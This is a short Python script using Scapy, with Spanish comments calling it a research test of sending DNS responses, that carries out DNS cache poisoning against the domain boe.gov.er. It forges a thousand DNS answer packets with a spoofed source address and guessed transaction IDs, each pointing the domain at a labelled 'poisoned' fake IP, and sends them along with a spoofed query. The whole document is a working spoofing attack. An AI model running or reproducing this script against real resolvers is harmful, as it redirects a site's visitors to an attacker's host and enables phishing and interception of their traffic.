#"Prueba con fines de investigacion de envio de respuestas DNS"
#
#"IP DNS Autoritativo 196.200.96.1 del dominio: boe.gov.er "
#"IP DNS Resolver: 196.200.104.106 "
#"IP real sitio boe.gov.er: 196.200.104.42 "
#"IP envenenada sitio fake: 217.127.199.128 "
# id=65535
# 

from scapy.all import *
from scapy.layers.l2 import *
import time
url = "boe.gov.er"
SPOOF_ADDR = '217.127.199.128'
pkts = []
for x in range (10000,11000):
        pkt = Ether()/IP(dst="196.200.96.1",src="196.200.104.106")/UDP(dport=4250)/DNS(id=x,an=DNSRR(rrname=url, type='A', rclass='IN', ttl=350, rdata=SPOOF_ADDR))
        pkts.append(pkt)
dns = Ether()/IP(dst="217.127.199.128",src="196.200.104.42")/UDP()/DNS(qd=DNSQR(qname=url))
sendp(dns, verbose = 0)
for pkt in pkts:
        sendp(pkt, verbose=0)
        
